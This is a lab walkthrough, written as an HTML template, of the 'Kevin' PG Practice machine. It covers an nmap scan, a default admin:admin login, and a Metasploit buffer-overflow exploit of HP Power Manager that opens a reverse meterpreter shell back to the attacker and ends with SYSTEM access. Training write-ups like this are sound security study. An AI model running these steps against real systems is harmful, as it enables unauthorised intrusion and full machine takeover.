@@ -1,0 +1,147 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Kevin</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Easy | MyRating : Easy | ClaerTime 20min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/kevin]
+└─$ sudo nmap -p- -sCV $IP --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 20:55 EST
+Warning: 192.168.202.45 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.202.45
+Host is up (0.13s latency).
+Not shown: 65393 closed tcp ports (reset), 130 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         GoAhead WebServer
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.202.45/index.asp
+|_http-server-header: GoAhead-Webs
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+|_ssl-date: 2025-12-19T01:58:12+00:00; +50s from scanner time.
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2025-12-18T01:54:44
+|_Not valid after:  2026-06-19T01:54:44
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2025-12-19T01:57:57+00:00
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">HTTP is open on the target machine.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/kevin/1.png' %}" alt="">
+    <p class="text">The login page accepts default credential login with <u>admin:admin</u>.</p>
+</div>
+
+
+<p class="text">Searching CVE with searchsploit, I found several CVE codes.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/kevin]
+└─$ searchsploit HP Power Manager                
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id' Information Disclosure             | php/webapps/23163.txt
+Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)        | windows/remote/16785.rb
+Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buf | windows/remote/10099.py
+HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasploit)                    | cgi/remote/18015.rb
+----------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre></div>
+
+<p class="text">Since many of them use metasploit module, I opened msfconsole.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/kevin]
+└─$ msfconsole
+Metasploit tip: Use the capture plugin to start multiple 
+authentication-capturing and poisoning services
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                                                  
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                                                  
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                                                  
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                  
+                                                                                                                                 
+
+       =[ metasploit v6.4.99-dev                                ]
++ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > </code></pre></div>
+
+<div class="code-box"><pre><code>msf > search HP Power Manager
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/windows/http/hp_power_manager_filename       2011-10-19       normal     No     HP Power Manager 'formExportDataLogs' Buffer Overflow
+   1  exploit/windows/http/hpe_sim_76_amf_deserialization  2020-12-15       excellent  Yes    HPE Systems Insight Manager AMF Deserialization RCE
+   2    \_ target: Windows Command                         .                .          .      .
+   3    \_ target: Windows Powershell                      .                .          .      .
+   4  exploit/windows/http/hp_power_manager_login          2009-11-04       average    No     Hewlett-Packard Power Manager Administration Buffer Overflow
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/hp_power_manager_login
+
+msf > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/hp_power_manager_filename) > set LHOST 192.168.45.175
+LHOST => 192.168.45.175
+msf exploit(windows/http/hp_power_manager_filename) > set RHOSTS 192.168.202.45</code></pre></div>
+
+<p class="text">Then, run it.</p>
+<div class="code-box"><pre><code>msf exploit(windows/http/hp_power_manager_filename) > run
+[*] Started reverse TCP handler on 192.168.45.175:4444 
+[*] Generating payload...
+[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
+[*] Sending stage (188998 bytes) to 192.168.202.45
+[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)
+[*] Meterpreter session 1 opened (192.168.45.175:4444 -> 192.168.202.45:49188) at 2025-12-18 21:14:09 -0500
+
+meterpreter > </code></pre></div>
+
+<p class="text">Opening shell, we can confirm we got NA user.</p>
+<div class="code-box"><pre><code>meterpreter > shell
+Process 3520 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system</code></pre></div>
+
+</body>
+</html>
